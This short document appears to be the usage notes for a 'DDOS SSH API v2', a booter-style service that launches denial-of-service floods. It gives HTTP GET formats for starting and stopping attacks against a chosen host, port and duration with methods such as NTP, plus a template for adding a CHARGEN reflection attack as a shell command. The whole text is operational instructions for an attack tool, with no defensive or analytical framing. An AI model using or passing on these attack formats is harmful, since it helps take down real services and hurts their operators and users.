DDOS SSH API v2


Launch attack:
  - Format: GET http://yourlink.co/?host=HOST&port=PORT&time=TIME&method=METHOD
  - Format example: GET http://yourlink.co/?host=127.0.0.1&port=80&time=60&method=NTP

Stop attack:
  - Format: GET http://yourlink.co/?host=HOST&port=PORT&method=STOP
  - Format example: GET http://yourlink.co/?host=127.0.0.1&&method=STOP
  
Add method:
  - Format example: $_METHOD["CHARGEN"] = "./chargen %ip% %port% chargen.txt 1 -1 %time%";


